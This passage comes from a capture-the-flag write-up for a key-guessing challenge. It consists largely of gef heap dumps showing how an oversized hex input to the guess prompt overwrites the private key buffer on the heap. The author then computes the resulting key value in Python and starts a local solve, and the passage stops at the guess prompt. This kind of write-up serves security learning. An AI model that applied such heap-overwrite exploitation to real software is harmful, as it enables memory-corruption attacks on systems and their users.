    0x555555559320|+0x00090|+0x00320: 0xc2f2e0f7ec137c1f 0x0000000000000000 | .|.............. |
    0x555555559330|+0x00000|+0x00330: 0x0000000000000000 0x0000000000000091 | ................ |
    0x555555559340|+0x00010|+0x00340: 0xd8e5a49faee4715b 0x53c99a711db35691 | [q.......V..q..S |
    0x555555559350|+0x00020|+0x00350: 0x1be6608907916ac6 0xfc2d630eca55a96c | .j...`..l.U..c-. |
    0x555555559360|+0x00030|+0x00360: 0xeb3d873fef41ff29 0x0f8cb052b113291d | ).A.?.=..)..R... |
    0x555555559370|+0x00040|+0x00370: 0x70d7f0704d0fdfef 0xfab2ba92ba6626b9 | ...Mp..p.&f..... |
    0x555555559380|+0x00050|+0x00380: 0xc3e2f487e7e92fc3 0x9a3dcb8e05677ad1 | ./.......zg...=. |
    0x555555559390|+0x00060|+0x00390: 0x841de41edb37765e 0x32a79921162e015a | ^v7.....Z...!..2 |
    0x5555555593a0|+0x00070|+0x003a0: 0xe76327f2c2ce281d 0x69144ebe542afa85 | .(...'c...*T.N.i |
    0x5555555593b0|+0x00080|+0x003b0: 0x6d2eaed56ef4cc9d 0xa7b3eada13b3ab7e | ...n...m~....... |
    0x5555555593c0|+0x00000|+0x003c0: 0x6179707bf609be0f 0x0000000000000021 | ....{pya!....... |
    0x5555555593d0|+0x00010|+0x003d0: 0x0000000000000002 0x0000000000000000 | ................ |
    0x5555555593e0|+0x00000|+0x003e0: 0x0000000000000000 0x0000000000000091 | ................ |
    0x5555555593f0|+0x00010|+0x003f0: 0xaed5803050029f73 0x36bd3ef0141fa743 | s..P0...C....>.6 |
    0x555555559400|+0x00020|+0x00400: 0xf99424aa7cce41e1 0x697617b9e124943d | .A.|.$..=.$...vi |
    0x555555559410|+0x00030|+0x00410: 0x3a34a410435c83ad 0xcc3c3d5c9d672b1c | ..\C..4:.+g.\=<. |
    0x555555559420|+0x00040|+0x00420: 0x7c55a28c488efa27 0x9d47fe4362a75366 | '..H..U|fS.bC.G. |
    0x555555559430|+0x00050|+0x00430: 0xf3b2c859a57ab680 0xe1cb24ffe8b33709 | ..z.Y....7...$.. |
    0x555555559440|+0x00060|+0x00440: 0x49c5460be4e617ad 0x0584015f5520a92f | .....F.I/. U_... |
    0x555555559450|+0x00070|+0x00450: 0x252ac493f59b9cc2 0xb2cb9aac340c861f | ......*%...4.... |
    0x555555559460|+0x00080|+0x00460: 0x41d47a5015f6f528 0x2f33043cb10185e3 | (...Pz.A....<.3/ |
    0x555555559470|+0x00000|+0x00470: 0x6741fc53d593d90e 0x0000000000000801 | ....S.Ag........ |  <-  largebins[idx=79,sz=0x800-0x840][1/1]
    0x555555559480|+0x00010|+0x00480: 0x00007ffff7e04010 0x00007ffff7e04010 | .@.......@...... |
    0x555555559490|+0x00020|+0x00490: 0x0000555555559470 0x0000555555559470 | p.UUUU..p.UUUU.. |
    0x5555555594a0|+0x00030|+0x004a0: 0x817729d37265ccd4 0x1eb151d5d540e4a1 | ..er.)w...@..Q.. |
    ...
    0x555555559c60|+0x007f0|+0x00c60: 0x5e3584b6c812620c 0x63f3de1f7cae2f17 | .b....5^./.|...c |
    0x555555559c70|+0x00000|+0x00c70: 0x0000000000000800 0x0000000000000410 | ................ |
    0x555555559c80|+0x00010|+0x00c80: 0x3335636631343736 0x6530396433393564 | 6741fc53d593d90e |
    0x555555559c90|+0x00020|+0x00c90: 0x6333343033336632 0x3365353831303162 | 2f33043cb10185e3 |
    0x555555559ca0|+0x00030|+0x00ca0: 0x3035613734643134 0x3832356636663531 | 41d47a5015f6f528 |
    0x555555559cb0|+0x00040|+0x00cb0: 0x6361613962633262 0x6631363863303433 | b2cb9aac340c861f |
    0x555555559cc0|+0x00050|+0x00cc0: 0x3339346361323532 0x3263633962393566 | 252ac493f59b9cc2 |
    0x555555559cd0|+0x00060|+0x00cd0: 0x6635313034383530 0x6632396130323535 | 0584015f5520a92f |
    0x555555559ce0|+0x00070|+0x00ce0: 0x6230363435633934 0x6461373136653465 | 49c5460be4e617ad |
    0x555555559cf0|+0x00080|+0x00cf0: 0x6666343262633165 0x3930373333623865 | e1cb24ffe8b33709 |
    0x555555559d00|+0x00090|+0x00d00: 0x3935386332623366 0x3038366261373561 | f3b2c859a57ab680 |
    0x555555559d10|+0x000a0|+0x00d10: 0x3334656637346439 0x3636333537613236 | 9d47fe4362a75366 |
    0x555555559d20|+0x000b0|+0x00d20: 0x6338326135356337 0x3732616665383834 | 7c55a28c488efa27 |
    0x555555559d30|+0x000c0|+0x00d30: 0x6335643363336363 0x6331623237366439 | cc3c3d5c9d672b1c |
    0x555555559d40|+0x000d0|+0x00d40: 0x3031346134336133 0x6461333863353334 | 3a34a410435c83ad |
    0x555555559d50|+0x000e0|+0x00d50: 0x3962373136373936 0x6433343934323165 | 697617b9e124943d |
    0x555555559d60|+0x000f0|+0x00d60: 0x6161343234393966 0x3165313465636337 | f99424aa7cce41e1 |
    0x555555559d70|+0x00100|+0x00d70: 0x3066653364623633 0x3334376166313431 | 36bd3ef0141fa743 |
    0x555555559d80|+0x00110|+0x00d80: 0x3033303835646561 0x3337663932303035 | aed5803050029f73 |
    0x555555559d90|+0x00120|+0x00d90: 0x0000000000000000 0x0000000000000000 | ................ |
    * 46 lines, 0x2e0 bytes
    0x55555555a080|+0x00000|+0x01080: 0x0000000000000000 0x000000000001ff81 | ................ |  <-  top
    0x55555555a090|+0x00010|+0x01090: 0xff0135da91f0c8ac 0xd1c27de02929688e | .....5...h)).}.. |
    0x55555555a0a0|+0x00020|+0x010a0: 0xd8d218b2ce78a76b 0x10f68e3f7c9fc18b | k.x........|?... |
    ...
    0x55555555a900|+0x00880|+0x01900: 0xe2799023dad3d707 0xe4c15a4c575020f2 | ....#.y.. PWLZ.. |
    0x55555555a910|+0x00000|+0x01910: 0x42f6ab07289ab415 0x000000000001f6f1 | ...(...B........ |
    gef> heap bins large
    ----------------------------------------------------------------------------------------- Large Bins for arena 'main_arena' -----------------------------------------------------------------------------------------
    large_bins[idx=79, size=0x800-0x840, @0x7ffff7e04020]: fd=0x555555559470, bk=0x7ffff7e04010
     -> Chunk(base=0x555555559470, addr=0x555555559480, size=0x800, flags=PREV_INUSE, fd=0x7ffff7e04010 <main_arena+0x550>, bk=0x7ffff7e04010 <main_arena+0x550>, fd_nextsize=0x555555559470, bk_nextsize=0x555555559470)
    [+] Found 1 valid chunks in 1 large bins (when traced from `bk`)
```

`

Notice that the private key limbs are now at `0x55555555a090`, which is the top chunk. If we enter a  value that is sufficiently large, it will be placed at the top chunk, instead of the Large Bin chunk at `0x555555559470` (where the  limbs end).

For instance, we can use exactly 2184 hexadecimal digits (`PRIVKEY_SIZE`), so that it fills the whole private key buffer:

`

```
    gef> shell python3 -c 'print("A" * 2_184)'
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    gef> run
    Starting program: ./test
    [Thread debugging using libthread_db enabled]
    Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
    Public Key: 836aeae31ddfd3b15f73c0f915e62fb3cbe3c9ef1ab81552eef38858d8f4524acfa11be0d4f694fff39e8c323b0602afcc4c5f3c9d64f4350bc24efcab36d2f22307d0ad069508d80520a38db6bab672d54382c5ecfc24af29c79d9d6cc9e34b0ea004f7f1
    4451bebc2a7f32d8b16d082f33b47f8fb15c4f3a97b9038e7beedb5d9a7984ac75bae7
    1> Print public key
    2> Start over
    3> Submit answer
    4> Exit
    >
    2
    1> Print public key
    2> Start over
    3> Submit answer
    4> Exit
    >
    3
    Enter your guess (hex):
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Incorrect!
    1> Print public key
    2> Start over
    3> Submit answer
    4> Exit
    >
    ^C
    Program received signal SIGINT, Interrupt.
    0x00007ffff7d1ba61 in __GI___libc_read (fd=0x0, buf=0x7ffff7e03963 <_IO_2_1_stdin_+131>, nbytes=0x1) at ../sysdeps/unix/sysv/linux/read.c:26
    warning: 26     ../sysdeps/unix/sysv/linux/read.c: No such file or directory
```

`

`

```
    gef> visual-heap -n
    0x555555559000|+0x00000|+0x00000: 0x0000000000000000 0x0000000000000291 | ................ |
    0x555555559010|+0x00010|+0x00010: 0x0000000000000000 0x0000000000000000 | ................ |
    0x555555559020|+0x00020|+0x00020: 0x0000000000000000 0x0000000000000000 | ................ |
    0x555555559030|+0x00030|+0x00030: 0x0000000000000000 0x0000000000000000 | ................ |
    0x555555559040|+0x00040|+0x00040: 0x0000000000000000 0x0000000000000000 | ................ |
    0x555555559050|+0x00050|+0x00050: 0x0000000000000000 0x0000000000000000 | ................ |
    0x555555559060|+0x00060|+0x00060: 0x0000000000000000 0x0000000000000000 | ................ |
    0x555555559070|+0x00070|+0x00070: 0x0000000000000000 0x0000000100000000 | ................ |
    0x555555559080|+0x00080|+0x00080: 0x0000000000000000 0x0000000000000000 | ................ |
    * 27 lines, 0x1b0 bytes
    0x555555559240|+0x00240|+0x00240: 0x0000555555559900 0x0000000000000000 | ..UUUU.......... |
    0x555555559250|+0x00250|+0x00250: 0x0000000000000000 0x0000000000000000 | ................ |
    0x555555559260|+0x00260|+0x00260: 0x0000000000000000 0x0000000000000000 | ................ |
    0x555555559270|+0x00270|+0x00270: 0x0000000000000000 0x0000000000000000 | ................ |
    0x555555559280|+0x00280|+0x00280: 0x0000000000000000 0x0000000000000000 | ................ |
    0x555555559290|+0x00000|+0x00290: 0x0000000000000000 0x00000000000000a1 | ................ |
    0x5555555592a0|+0x00010|+0x002a0: 0xb1cb493f5dc8e2b7 0xa79334e23b66ad23 | ...]?I..#.f;.4.. |
    0x5555555592b0|+0x00020|+0x002b0: 0x37ccc1120f22d58c 0xf85ac61d94ab52d8 | .."....7.R....Z. |
    0x5555555592c0|+0x00030|+0x002c0: 0xd67b0e7fde83fe53 0x1f1960a56226523b | S.....{.;R&b.`.. |
    0x5555555592d0|+0x00040|+0x002d0: 0xe1afe0e09a1fbfde 0xf565752574cc4d72 | ........rM.t%ue. |
    0x5555555592e0|+0x00050|+0x002e0: 0x87c5e90fcfd25f87 0x347b971c0acef5a3 | ._............{4 |
    0x5555555592f0|+0x00060|+0x002f0: 0x083bc83db66eecbd 0x654f32422c5c02b5 | ..n.=.;...\,B2Oe |
    0x555555559300|+0x00070|+0x00300: 0xcec64fe5859c503a 0xd2289d7ca855f50b | :P...O....U.|.(. |
    0x555555559310|+0x00080|+0x00310: 0xda5d5daadde9993a 0x4f67d5b4276756fc | :....]]..Vg'..gO |
    0x555555559320|+0x00090|+0x00320: 0xc2f2e0f7ec137c1f 0x0000000000000000 | .|.............. |
    0x555555559330|+0x00000|+0x00330: 0x0000000000000000 0x0000000000000091 | ................ |
    0x555555559340|+0x00010|+0x00340: 0xd8e5a49faee4715b 0x53c99a711db35691 | [q.......V..q..S |
    0x555555559350|+0x00020|+0x00350: 0x1be6608907916ac6 0xfc2d630eca55a96c | .j...`..l.U..c-. |
    0x555555559360|+0x00030|+0x00360: 0xeb3d873fef41ff29 0x0f8cb052b113291d | ).A.?.=..)..R... |
    0x555555559370|+0x00040|+0x00370: 0x70d7f0704d0fdfef 0xfab2ba92ba6626b9 | ...Mp..p.&f..... |
    0x555555559380|+0x00050|+0x00380: 0xc3e2f487e7e92fc3 0x9a3dcb8e05677ad1 | ./.......zg...=. |
    0x555555559390|+0x00060|+0x00390: 0x841de41edb37765e 0x32a79921162e015a | ^v7.....Z...!..2 |
    0x5555555593a0|+0x00070|+0x003a0: 0xe76327f2c2ce281d 0x69144ebe542afa85 | .(...'c...*T.N.i |
    0x5555555593b0|+0x00080|+0x003b0: 0x6d2eaed56ef4cc9d 0xa7b3eada13b3ab7e | ...n...m~....... |
    0x5555555593c0|+0x00000|+0x003c0: 0x6179707bf609be0f 0x0000000000000021 | ....{pya!....... |
    0x5555555593d0|+0x00010|+0x003d0: 0x0000000000000002 0x0000000000000000 | ................ |
    0x5555555593e0|+0x00000|+0x003e0: 0x0000000000000000 0x0000000000000091 | ................ |
    0x5555555593f0|+0x00010|+0x003f0: 0x5d9a7984ac75bae7 0x3a97b9038e7beedb | ..u..y.]..{....: |
    0x555555559400|+0x00020|+0x00400: 0x2f33b47f8fb15c4f 0xbc2a7f32d8b16d08 | O\....3/.m..2.*. |
    0x555555559410|+0x00030|+0x00410: 0x0ea004f7f14451be 0x29c79d9d6cc9e34b | .QD.....K..l...) |
    0x555555559420|+0x00040|+0x00420: 0xd54382c5ecfc24af 0x0520a38db6bab672 | .$....C.r..... . |
    0x555555559430|+0x00050|+0x00430: 0x2307d0ad069508d8 0x0bc24efcab36d2f2 | .......#..6..N.. |
    0x555555559440|+0x00060|+0x00440: 0xcc4c5f3c9d64f435 0xf39e8c323b0602af | 5.d.<_L....;2... |
    0x555555559450|+0x00070|+0x00450: 0xcfa11be0d4f694ff 0xeef38858d8f4524a | ........JR..X... |
    0x555555559460|+0x00080|+0x00460: 0xcbe3c9ef1ab81552 0x5f73c0f915e62fb3 | R......../....s_ |
    0x555555559470|+0x00000|+0x00470: 0x836aeae31ddfd3b1 0x0000000000000461 | ......j.a....... |
    0x555555559480|+0x00010|+0x00480: 0xbc014ac28afe52d3 0x61239f912f2e43a5 | .R...J...C./..#a |
    0x555555559490|+0x00020|+0x00490: 0xe47fb6576698a2f8 0xe5e09847478967c7 | ...fW....g.GG... |
    0x5555555594a0|+0x00030|+0x004a0: 0x789b12b7599d77a7 0xca61f8b6b1145488 | .w.Y...x.T....a. |
    0x5555555594b0|+0x00040|+0x004b0: 0x3b20af541de359ff 0x7a288d3c93219ae5 | .Y..T. ;..!.<.(z |
    0x5555555594c0|+0x00050|+0x004c0: 0x98ddd0555112e646 0x2ee3078f35cac3bc | F..QU......5.... |
    0x5555555594d0|+0x00060|+0x004d0: 0x91269cb017d266dd 0x2b9cb7a0e410689a | .f....&..h.....+ |
    0x5555555594e0|+0x00070|+0x004e0: 0xa51ee9563e6f1cf3 0x5e1f43a039402730 | ..o>V...0'@9.C.^ |
    0x5555555594f0|+0x00080|+0x004f0: 0x3774c9a2631e0e12 0xde6c3a40a2966737 | ...c..t77g..@:l. |
    0x555555559500|+0x00090|+0x00500: 0x2cd41182cab9af17 0xaaaaaaaaaaaaaaaa | .......,........ |
    0x555555559510|+0x000a0|+0x00510: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa | ................ |
    * 58 lines, 0x3a0 bytes
    0x5555555598c0|+0x00450|+0x008c0: 0x00000000aaaaaaaa 0x0a0a0a0a0a0a0a0a | ................ |
    0x5555555598d0|+0x00000|+0x008d0: 0x0a0a0a0a0a0a0a0a 0x0000000000000021 | ........!....... |  <-  unsortedbins[1/1]
    0x5555555598e0|+0x00010|+0x008e0: 0x00007ffff7e03b20 0x00007ffff7e03b20 |  ;...... ;...... |
    0x5555555598f0|+0x00000|+0x008f0: 0x0000000000000020 0x0000000000000380 |  ............... |
    0x555555559900|+0x00010|+0x00900: 0x0000000555555559 0x7a022417001adcd7 | YUUU.........$.z |  <-  tcache[idx=54,sz=0x380][1/1]
    0x555555559910|+0x00020|+0x00910: 0xc98ff9903ab63594 0x4ec504b98479cd58 | .5.:....X.y....N |
    ...
    0x555555559c60|+0x00370|+0x00c60: 0x3146b482f1e97d8a 0xd45859116c184c6e | .}....F1nL.l.YX. |
    0x555555559c70|+0x00000|+0x00c70: 0x0000000000000500 0x0000000000000411 | ................ |
    0x555555559c80|+0x00010|+0x00c80: 0x3365616561363338 0x3162336466646431 | 836aeae31ddfd3b1 |
    0x555555559c90|+0x00020|+0x00c90: 0x3966306333376635 0x3362663236653531 | 5f73c0f915e62fb3 |
    0x555555559ca0|+0x00030|+0x00ca0: 0x6665396333656263 0x3235353138626131 | cbe3c9ef1ab81552 |
    0x555555559cb0|+0x00040|+0x00cb0: 0x3835383833666565 0x6134323534663864 | eef38858d8f4524a |
    0x555555559cc0|+0x00050|+0x00cc0: 0x3065623131616663 0x6666343936663464 | cfa11be0d4f694ff |
    0x555555559cd0|+0x00060|+0x00cd0: 0x3233633865393366 0x6661323036306233 | f39e8c323b0602af |
    0x555555559ce0|+0x00070|+0x00ce0: 0x6333663563346363 0x3533346634366439 | cc4c5f3c9d64f435 |
    0x555555559cf0|+0x00080|+0x00cf0: 0x6366653432636230 0x3266326436336261 | 0bc24efcab36d2f2 |
    0x555555559d00|+0x00090|+0x00d00: 0x6461306437303332 0x3864383035393630 | 2307d0ad069508d8 |
    0x555555559d10|+0x000a0|+0x00d10: 0x6438336130323530 0x3237366261623662 | 0520a38db6bab672 |
    0x555555559d20|+0x000b0|+0x00d20: 0x3563323833343564 0x6661343263666365 | d54382c5ecfc24af |
    0x555555559d30|+0x000c0|+0x00d30: 0x6439643937633932 0x6234336539636336 | 29c79d9d6cc9e34b |
    0x555555559d40|+0x000d0|+0x00d40: 0x3766343030616530 0x6562313534343166 | 0ea004f7f14451be |
    0x555555559d50|+0x000e0|+0x00d50: 0x3233663761326362 0x3830643631623864 | bc2a7f32d8b16d08 |
    0x555555559d60|+0x000f0|+0x00d60: 0x6637346233336632 0x6634633531626638 | 2f33b47f8fb15c4f |
    0x555555559d70|+0x00100|+0x00d70: 0x3330396237396133 0x6264656562376538 | 3a97b9038e7beedb |
    0x555555559d80|+0x00110|+0x00d80: 0x3438393761396435 0x3765616235376361 | 5d9a7984ac75bae7 |
    0x555555559d90|+0x00120|+0x00d90: 0x0000000000000000 0x0000000000000000 | ................ |
    * 46 lines, 0x2e0 bytes
    0x55555555a080|+0x00000|+0x01080: 0x0000000000000000 0x000000000001ff81 | ................ |  <-  top
    0x55555555a090|+0x00010|+0x01090: 0x0a0a0a0a0a0a0a0a 0x0a0a0a0a0a0a0a0a | ................ |
    * 135 lines, 0x870 bytes
    0x55555555a910|+0x00890|+0x01910: 0x0a0a0a0a0a0a0a0a 0x000000000001f6f1 | ................ |
    ...
    gef> c
    Continuing.
    1
    Public Key: 79dbb66710060b6ae4e71f7aa53cab76324a3c6f67acd4c58d069d8f0a79d0a3813dfa1d60d1b8a2f6aa363e10b33cc5023d6af5c6fb7a2a1c640f7e2c0aeae7d1b3204b0dbd9df51f48c374592e27563dc57bfbd0a441153fc629dad6d97a83a858fdedfd9ad6a2ee072a0c7b284ebb7845740a77f5105493a49913a65f20b3c813d368e06ef8b8
    1> Print public key
    2> Start over
    3> Submit answer
    4> Exit
    >
```

`

Notice how the private key is at `0x55555555a090`, and its limbs are filled with `0x0a0a0a0a0a0a0a0a`. I don’t really know why it is not `0xaaaaaaaaaaaaaaaa`, but whatever. The thing is that we have overwritten the private key, so we can easily set  to solve the challenge.

Instead of sending this large hexadecimal string (`"0a0a...0a"`), we will need to compute its equivalent value in :

`

```
    >>> priv = int('0a' * 0x111 * 8, 16)
    >>> pow(g, priv, p) == pow(g, priv % q, p)
    True
    >>> hex(priv % q)
    '0x44cd735b7b1c5dca3d63138eb0ec40dc09708cb3ae96d0b6e100010ff6935dc840d21f5744e78e203f0078e384c6d47bb974f8866ec5a70218a1393b9abcc767d7e064838712f8138133559b18a5a7f0dc899748b4ebdf75d873b18c0d47fe553c271cd13ba79cee4b6b09f501d0dc7e0b9c1e44fa8a84c87d0a61f0e49c5de5a83da2731c23d75b'
```

`

With this, we can solve the challenge locally:

`

```
    $ ./chall
    Public Key: 1084bbaa6e3fb42980128f12c1a2d12946dbaff63a87ad95a43bda96b810c56a0d6b59d4f2f55e5cf90cddb3997741ae54dc3fb39cb672cdc82f2d634d8d97126dd79487951d8bc630bf3766b615949be4c1494ed28f1d9fa175f45fb9db8d8aa28ba514bdd3d8930e393a6eca1078bea75a4d971e49133bb181e5d470256b6e8db4a82ddd527158
    1> Print public key
    2> Start over
    3> Submit answer
    4> Exit
    >
    2
    1> Print public key
    2> Start over
    3> Submit answer
    4> Exit
    >
    3
    Enter your guess (hex):
